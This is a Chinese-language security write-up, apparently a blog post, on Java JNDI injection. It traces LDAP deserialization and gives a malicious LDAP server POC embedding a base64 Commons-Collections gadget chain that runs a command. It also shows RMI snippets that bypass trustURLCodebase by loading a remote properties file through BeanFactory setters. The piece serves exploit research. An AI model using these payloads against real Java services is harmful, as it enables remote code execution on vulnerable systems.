## Deserialization

### LDAP

 **在通过LDAP协议访问远程服务的时候，我们可以跟进到**`LdapCtx#c_lookup`方法中

![wKg0C2NxyHKAVHxbAABP1fXzUsU993.png](https://image.3001.net/images/20221206/1670296404_638eb354cfa075206f67f.png!small)

 **这里调用了**`doSearchOnce`方法获取LDAP远程返回的Result数据

 **到最后会来到**`LdapCtx#doSearch`方法中

![wKg0C2NxyJeAS6LLAAAuaEd2XD0873.png](https://image.3001.net/images/20221206/1670296405_638eb35549199cfb6ffcb.png!small)

 **存在有**`LdapClient#search`方法的调用

 **首先他会封装了一个**`LdapRequest`的请求，之后通过 `getSearchReply`方法的调用获取对应的查询结果

![wKg0C2NxyKWAF6e0AAA5RK8qMBU555.png](https://image.3001.net/images/20221206/1670296405_638eb355b2d05479faff8.png!small)

 **跟进一下**

![wKg0C2NxyLGAdrCPAACLKoIaYjA886.png](https://image.3001.net/images/20221206/1670296406_638eb3563d5c798283bc3.png!small)

 **在获取了返回的属性之后，将其放入了**`BasicAttributes`类对象中

![wKg0C2NxyLuAQuEvAABAYQHTX4g837.png](https://image.3001.net/images/20221206/1670296406_638eb356bd7722ec3be60.png!small)

 **之后将会把获取到的**`LdapEntry`封装进入 `LdapResult`对象中去

![wKg0C2NxyMWAM8eSAABXq2fdpK8022.png](https://image.3001.net/images/20221206/1670296407_638eb35747cd905fc49c9.png!small)

 **最后返回了这个**`LdapResult`对象

 **好的，现在回到了**`LdapCtx#c_lookup`方法中来了

![wKg0C2NxyNCAYqatAABSoJWWhfs820.png](https://image.3001.net/images/20221206/1670296407_638eb357b19dfe146389a.png!small)

 **在**`682`行中的var23就是前面返回的 `LdapResult`对象，首先会判断其的 `entries`属性是否为不为空，且要求只存在有一个
`LdapEntry`对象，如果满足上面的条件，就会取出 `LdapResult`中的 `LdapEntry`对象，其为
`var25`这个变量，并且也会取出 `LdapEntry`中的属性，上图中的 `var4`是一个 `BasicAttributes`对象

![wKg0C2NxyN6AG7b2AABSO1wiq9g930.png](https://image.3001.net/images/20221206/1670296408_638eb35838e5b5b9b75cb.png!small)

 **会判断属性中是否存在有**`javaClassName`，如果有

 **将会调用**`Obj.decodeObject`方法进行解析

![wKg0C2NxyOmAVsoEAACEUWRG3JA818.png](https://image.3001.net/images/20221206/1670296408_638eb358b2ceb0ffea8ec.png!small)

 **首先获取了javaCodeBase属性值，之后在**`145`行中判断了是否存在有
`javaSerializedData`属性，如果有就在获取了对应的ClassLoader之后通过调用
`deserializeObject`方法进行反序列化

![wKg0C2NxyPOAXZxZAABzfh7kx3Y486.png](https://image.3001.net/images/20221206/1670296409_638eb35934abe70accd5e.png!small)

 **最后调用了**`java.io.InputStream#readObject`方法进行了反序列化

#### POC

    
    
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    import com.unboundid.util.Base64;
    
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    import java.net.InetAddress;
    
    public class SerializeLdapServer {
        public static void main(String[] args) throws Exception {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("127.0.0.1"),
                    389,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));
            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
            directoryServer.startListening();
            System.out.println("ldap://127.0.0.1:389 is working...");
        }
    
        private static class OperationInterceptor extends InMemoryOperationInterceptor {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                String base = result.getRequest().getBaseDN();
    
                Entry entry = new Entry(base);
                entry.addAttribute("javaClassName", "hahaha");
    
                try {
                    entry.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv" +
                            "cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB" +
                            "H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4" +
                            "cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSC" +
                            "nnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5z" +
                            "Zm*ybWVyO3hwc3IAOm*yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFp" +
                            "bmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUv" +
                            "Y29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9u" +
                            "cy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hl" +
                            "LmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGU" +
                            "AgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBz" +
                            "cgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm*rZXJUcmFuc2Zv" +
                            "cm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5h" +
                            "bWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNz" +
                            "O3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1" +
                            "cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA" +
                            "AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAA" +
                            "AnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAA" +
                            "AAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAA" +
                            "AAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdl" +
                            "chLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAB" +
                            "c3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xk" +
                            "eHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));
                    result.sendSearchEntry(entry);
                    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
    

exec:347, Runtime (java.lang)  
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
invoke:62, NativeMethodAccessorImpl (sun.reflect)  
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
invoke:498, Method (java.lang.reflect)  
transform:125, InvokerTransformer (org.apache.commons.collections.functors)  
transform:122, ChainedTransformer (org.apache.commons.collections.functors)  
get:151, LazyMap (org.apache.commons.collections.map)  
getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)  
hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)  
hash:339, HashMap (java.util)  
put:612, HashMap (java.util)  
readObject:342, HashSet (java.util)  
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)  
invoke:62, NativeMethodAccessorImpl (sun.reflect)  
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)  
invoke:498, Method (java.lang.reflect)  
invokeReadObject:1170, ObjectStreamClass (java.io)  
readSerialData:2178, ObjectInputStream (java.io)  
readOrdinaryObject:2069, ObjectInputStream (java.io)  
readObject0:1573, ObjectInputStream (java.io)  
readObject:431, ObjectInputStream (java.io)  
deserializeObject:531, Obj (com.sun.jndi.ldap)  
decodeObject:239, Obj (com.sun.jndi.ldap)  
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)  
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)  
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)  
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)  
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)  
lookup:417, InitialContext (javax.naming)  
main:8, LdapClient (pers.jndi)

### RMI

 **RMI也有着同样的反序列化利用**

 **在**`sun.rmi.transport.StreamRemoteCall#executeCall`中有着漏洞点

![wKg0C2NxyQuAKzulAABhjHk5f5A421.png](https://image.3001.net/images/20221206/1670296409_638eb359a0c25997313b3.png!small)

## 覆盖trustURLCodebase

 **在高版本中的JDK中不管是Ldap或者是RMI都存在有trustURLCodebase的限制**

 **如果我们能够将该属性值置为true也就能够间接绕过限制**

 **所以我们需要寻找到能够**`System.setProperty`的调用，覆盖掉trustURLCodebase属性值

**且我们有了前面的基础，我们知道对于**`org.apache.naming.factory.BeanFactory`这个Factory来说，需要目标的Bean
Class满足

  *  **必须有一个无参构造方法**
  *  **有public的setter方法且参数为一个String类型。**

 **在**`commons-configuration`包中存在有`org.apache.commons.configuration.SystemConfiguration#setSystemProperties`方法满足条件

![wKg0C2NxyRWAYRpEAABJhqNkmUU048.png](https://image.3001.net/images/20221206/1670296410_638eb35a1ca1080f3f6ca.png!small)

 **从该方法的注释我们知道，这个方法能够从一个属性配置文件中取值设置对应的**`system properties`

![wKg0C2NxyRAIHNmAABY4ncuMVU541.png](https://image.3001.net/images/20221206/1670296410_638eb35a92b30c2f5e79c.png!small)

 **在创建了**`PropertiesConfiguration`对象config之后调用load方法进行配置文件的加载

![wKg0C2NxySiALZv2AABJDNVBI8675.png](https://image.3001.net/images/20221206/1670296411_638eb35b0e1c7cc415421.png!small)

 **继续调用了**`load`方法

![wKg0C2NxyTGAQsCAABE0qNFKHE874.png](https://image.3001.net/images/20221206/1670296411_638eb35b7bc846824b96f.png!small)

 **调用了load方法加载远程url作为参数，获取远程配置**

![wKg0C2NxyTuAAb6hAABVRKn764448.png](https://image.3001.net/images/20221206/1670296412_638eb35c067ce725df218.png!small)

 **获取远程输入流**

 **之后调用load方法加载**

 **一直可以跟踪到**`PropertiesConfigurationLayout#load`方法中设置了属性和值之间的分隔符是`=`

![wKg0C2NxyUSAEQyvAABEzY3qqcE227.png](https://image.3001.net/images/20221206/1670296412_638eb35ca4e68efb43922.png!small)

 **同样在这个方法中通过一个while循环遍历**`reader`中的属性配置

![wKg0C2NxyU2AIgtXAABYutyQkXc798.png](https://image.3001.net/images/20221206/1670296413_638eb35d1f97e3bb51951.png!small)

 **最后回到了**`setSystemProperties`方法中

![wKg0C2NxyVeAeBi8AABbYzPBFSk225.png](https://image.3001.net/images/20221206/1670296413_638eb35d9a49680a67a03.png!small)

 **通过调用**`setSystemProperties`进行了属性的覆盖

![wKg0C2NxyWOAXxHWAABlGlcUEs465.png](https://image.3001.net/images/20221206/1670296414_638eb35e2031ee3946521.png!small)

 **这里就很明了了，通过迭代器，调用**`System.setProperty`为属性赋值

### commons-configuration

Registry registry = LocateRegistry.createRegistry(2000);  
ResourceRef resourceRef = new
ResourceRef("org.apache.commons.configuration.SystemConfiguration", null, "",
"", true, "org.apache.naming.factory.BeanFactory", null);  
resourceRef.add(new StringRefAddr("forceString", "x=setSystemProperties"));  
resourceRef.add(new StringRefAddr("x",
"[http://127.0.0.1/exp.properties"))](https://sec-in.com/outLinkPage/?target=http://127.0.0.1:8000/exp.properties%22\)\));  
ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);  
registry.bind("test", referenceWrapper);

![wKg0C2NxyXKAKbf5AABqUANtafQ450.png](https://image.3001.net/images/20221206/1670296414_638eb35e88a148ea2cb00.png!small)

### commons-configuration2

 **对于这个jar包和上面的大体流程差不多就不分析了**

Registry registry = LocateRegistry.createRegistry(2000);  
ResourceRef resourceRef = new
ResourceRef("org.apache.commons.configuration2.SystemConfiguration", null, "",
"", true, "org.apache.naming.factory.BeanFactory", null);  
resourceRef.add(new StringRefAddr("forceString", "x=setSystemProperties"));  
resourceRef.add(new StringRefAddr("x",
"[http://127.0.0.1/exp.properties"))](https://sec-in.com/outLinkPage/?target=http://127.0.0.1:8000/exp.properties%22\)\));  
ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);  
registry.bind("test", referenceWrapper);

![wKg0C2NxyXyACLoAAABfOQOoFVA635.png](https://image.3001.net/images/20221206/1670296414_638eb35ef321f5aaeeaf3.png!small)

### Groovy

 **在Groovy组件中存在有**`setSystemPropertyFrom`方法

![wKg0C2NxyYqAdQg9AACKkgHDNFU729.png](https://image.3001.net/images/20221206/1670296415_638eb35f6ffb610fcb446.png!small)

**这个BeanClass也满足条件，在该方法中，将会对**`namValue`参数值通过`=`进行分割，分别得到name和value值，之后调用了`System.setProperty`方法进行赋值

### 其他

 **当然还有这其他的第三方库存在有这样的功能的方法能够利用，只需要使用CodeQL或者其他静态代码分析工具进行筛选就行**

### 其他的BeanFactory

 **当然除了catalina.jar中的类**`org.apache.naming.factory.BeanFactory`可以利用

 **在**`tomcat-jdbc.jar`中也存在有`org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`这个BeanFactory

 **我们来看看他的**`getObjectInstance`方法

![wKg0C2NxyZWAUAyeAACeLO1T2sQ347.png](https://image.3001.net/images/20221206/1670296415_638eb35fe5e385f7a1dbf.png!small)

 **将会获取返回的**`Reference`类，实例化了目标类，之后分别取出了param和value的值之后调用`setProperty`方法

![wKg0C2NxyZ6ADh7pAACQJ3Yfxj4672.png](https://image.3001.net/images/20221206/1670296416_638eb3606770b233fc82f.png!small)

**在**`60`行的位置，他直接在name前面拼接上了`get`字符串，在取出了目标类的所有方法之后，通过for循环进行遍历获取setter的方法名，并调用

 **这里就很明显了，可以通过前面说的**`commons-configuration`/ `commons-configuration2`/
`Groovy`的setter方法来执行

 **这里给出一个例子**

Registry registry = LocateRegistry.createRegistry(2000);  
ResourceRef resourceRef = new
ResourceRef("org.apache.commons.configuration.SystemConfiguration", null, "",
"", true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory",
null);  
resourceRef.add(new StringRefAddr("systemProperties",
"[http://127.0.0.1/exp.properties"))](https://sec-in.com/outLinkPage/?target=http://127.0.0.1:8000/exp.properties%22\)\));  
ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);  
registry.bind("test", referenceWrapper);

![wKg0C2NxyamAQcd5AACCbPvwzR4609.png](https://image.3001.net/images/20221206/1670296416_638eb360e3e75b0b162f0.png!small)

## 版本限制

 **小于 Tomcat8 时无法使用 ELProcessor.eval 执行代码**  
 **只能在Tomcat下使用BeanFactory类调用任意方法**  
 **以较低版本Tomcat 如7.0.4时，BeanFactory只支持执行 setter 方法，无法再使用EL或Groovy执行**  
 **代码**

## Ref

[https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf](https://sec-in.com/outLinkPage/?target=https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf)

